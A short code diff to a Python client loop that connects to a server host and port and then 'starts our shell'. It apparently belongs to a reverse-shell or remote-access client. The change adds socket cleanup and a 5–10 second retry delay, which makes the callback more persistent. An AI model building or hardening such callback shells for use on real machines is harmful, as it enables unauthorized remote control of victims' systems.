@@ -133,8 +133,11 @@ def clientLoop():
             s.connect((SERVER_HOST,SERVER_PORT)) #Connect to server
             DISCONNECTED = False
         except:
-            sleep(random.randint(0,10)) #Try to join the server every 0-10 seconds
-
+            try:
+                s.close()
+            except:
+                pass
+            sleep(random.randint(0,5) + 5) #Try to join the server every 5-10 seconds
     #When finally connected, start our shell
     while True:
         try:
